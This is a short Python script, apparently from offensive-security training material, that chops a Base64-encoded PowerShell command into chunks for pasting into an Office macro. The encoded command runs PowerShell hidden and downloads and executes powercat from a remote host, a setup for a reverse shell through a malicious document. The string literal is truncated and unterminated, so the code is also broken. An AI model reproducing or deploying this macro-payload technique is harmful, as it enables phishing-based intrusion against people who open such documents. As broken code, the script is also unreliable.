# Python Script to take Base64 encoded Powershell Scripts and 
# make them fit within a Office macro String limit.
# Uploaded by Tom R.  20231107
# Credit Offensive Security 2023 - Creator of content.

str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4yMzAvcG93ZXJjYXQucHMxJyk7cG93ZXJjYX>

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')
